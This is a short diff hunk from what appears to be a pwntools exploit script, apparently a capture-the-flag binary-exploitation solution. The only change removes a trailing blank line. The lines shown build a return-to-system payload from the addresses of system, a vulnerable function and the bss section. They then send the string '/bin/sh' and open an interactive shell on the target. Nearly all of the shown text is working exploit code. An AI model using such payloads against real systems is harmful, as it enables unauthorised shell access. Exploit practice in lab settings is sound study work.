@@ -32,4 +32,3 @@ payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
 p.send(payload2)
 p.send('/bin/sh\x00')
 p.interactive()
-
